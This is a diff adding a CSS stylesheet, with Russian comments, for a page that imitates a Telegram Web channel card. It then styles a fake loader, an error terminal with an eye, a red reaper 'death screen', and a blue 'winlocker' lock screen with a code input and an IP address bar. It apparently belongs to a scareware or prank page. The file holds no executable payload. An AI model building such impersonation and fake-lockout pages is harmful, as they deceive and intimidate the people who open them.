@@ -1,0 +1,98 @@
+* { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-user-select: none; }
+body { background-color: #0e1621; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow: hidden; height: 100vh; width: 100vw; }
+
+#fs-notice {
+    display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+    background: rgba(20, 20, 20, 0.92); color: #ccc; padding: 10px 22px; border-radius: 8px;
+    font-size: 14px; font-family: sans-serif; z-index: 99999; box-shadow: 0 4px 20px rgba(0,0,0,0.8);
+    border: 1px solid rgba(255,255,255,0.08); animation: fadeInOut 3s forwards; pointer-events: none;
+}
+@keyframes fadeInOut {
+    0% { opacity: 0; transform: translate(-50%, -10px); }
+    15% { opacity: 1; transform: translate(-50%, 0); }
+    85% { opacity: 1; transform: translate(-50%, 0); }
+    100% { opacity: 0; transform: translate(-50%, -10px); }
+}
+
+/* Telegram Web */
+#tg-wrapper {
+    display: flex; flex-direction: column; height: 100vh; width: 100vw;
+    background-color: #0f1821;
+    background-image: url('https://web.telegram.org/a/chat-bg-dark.png');
+    background-repeat: repeat; background-size: 400px;
+}
+.tg-header {
+    height: 56px; background-color: #17212b; display: flex; align-items: center;
+    justify-content: space-between; padding: 0 24px; border-bottom: 1px solid #0e1621;
+}
+.tg-logo { display: flex; align-items: center; gap: 12px; font-weight: bold; font-size: 18px; color: #fff; }
+.tg-logo svg { width: 28px; height: 28px; fill: #2ea6ff; }
+.tg-dl-btn { background-color: #248bda; color: #fff; padding: 7px 16px; border-radius: 6px; font-weight: 600; font-size: 13px; text-transform: uppercase; cursor: pointer; border: none; }
+
+.tg-content { flex: 1; display: flex; align-items: center; justify-content: center; }
+.tg-card {
+    background-color: #17212b; width: 380px; padding: 32px 24px; border-radius: 12px;
+    text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+}
+.tg-avatar-img {
+    width: 110px; height: 110px; border-radius: 50%; margin: 0 auto 18px;
+    object-fit: cover; border: 2px solid #2ea6ff; display: block;
+    box-shadow: 0 0 15px rgba(46, 166, 255, 0.4);
+}
+.tg-title-row { display: flex; align-items: center; justify-content: center; gap: 6px; margin-bottom: 4px; }
+.tg-title { font-size: 22px; font-weight: 700; letter-spacing: 0.5px; }
+.verified-badge { width: 20px; height: 20px; fill: #2ea6ff; display: inline-block; }
+.tg-username { color: #7f91a4; font-size: 14px; margin-bottom: 6px; }
+.tg-subs { color: #7f91a4; font-size: 14px; margin-bottom: 22px; }
+.tg-main-btn {
+    background-color: #2ea6ff; color: #fff; border: none; padding: 12px; border-radius: 20px;
+    font-size: 14px; font-weight: 700; cursor: pointer; width: 100%; margin-bottom: 14px;
+    text-transform: uppercase; letter-spacing: 0.5px;
+}
+.tg-main-btn:hover { background-color: #2481cc; }
+.tg-preview { color: #7f91a4; font-size: 14px; cursor: pointer; }
+.tg-preview:hover { color: #2ea6ff; }
+
+/* Загрузка Telegram (5 секунд) */
+#tg-loader {
+    display: none; height: 100vh; width: 100vw; background-color: #0e1621;
+    flex-direction: column; align-items: center; justify-content: center; position: fixed; top: 0; left: 0; z-index: 100;
+}
+.spinner { width: 46px; height: 46px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #2ea6ff; border-radius: 50%; animation: spin 0.7s linear infinite; margin-bottom: 16px; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+.loader-text { color: #7f91a4; font-size: 14px; }
+
+/* Терминал с ошибками и глазом */
+#terminal-screen { display: none; height: 100vh; width: 100vw; padding: 30px; box-sizing: border-box; font-size: 20px; font-family: 'Courier New', monospace; background: #000; position: fixed; top: 0; left: 0; z-index: 200; }
+.boot-error { color: #fff; margin-bottom: 8px; font-weight: bold; }
+
+#eye-container { 
+    display: none; text-align: center; margin-top: 100px;
+}
+#eye-container svg { width: 130px; height: 130px; fill: #ffffff; }
+.alert-text { text-align: center; color: #fff; font-size: 32px; font-weight: bold; margin-top: 25px; letter-spacing: 4px; font-family: monospace; }
+
+/* Красный экран со жнецом */
+#death-screen { 
+    display: none; background-color: #8b0000; color: #fff; 
+    height: 100vh; width: 100vw; position: fixed; top: 0; left: 0; z-index: 300; 
+    flex-direction: column; align-items: center; justify-content: center; text-align: center; 
+}
+.death-art { 
+    white-space: pre; font-family: monospace; font-size: 15px; 
+    line-height: 1.1; margin-bottom: 20px; text-shadow: 0 0 8px #000;
+}
+#death-screen h1 { color: #fff; font-size: 34px; letter-spacing: 6px; margin-top: 0; font-family: monospace; }
+
+/* Синий Винлокер */
+#lock-screen { 
+    display: none; background-color: #0000aa; color: #fff; 
+    height: 100vh; width: 100vw; position: fixed; top: 0; left: 0; z-index: 400; 
+    flex-direction: column; align-items: center; justify-content: center; 
+    font-family: 'Courier New', monospace; padding: 20px; box-sizing: border-box; 
+}
+.lock-box { border: 2px solid #fff; padding: 25px; max-width: 820px; width: 100%; background-color: #0000aa; }
+.lock-box p { margin: 10px 0; font-size: 15px; line-height: 1.45; font-weight: bold; }
+.lock-input { width: 100%; padding: 10px; font-size: 18px; margin-top: 15px; background: #fff; color: #000; border: none; outline: none; box-sizing: border-box; font-family: monospace; }
+.lock-footer { margin-top: 18px; font-size: 14px; display: flex; justify-content: space-between; color: #fff; }
+.ip-bar { position: fixed; bottom: 12px; left: 16px; font-size: 14px; font-family: monospace; color: #fff; z-index: 401; }
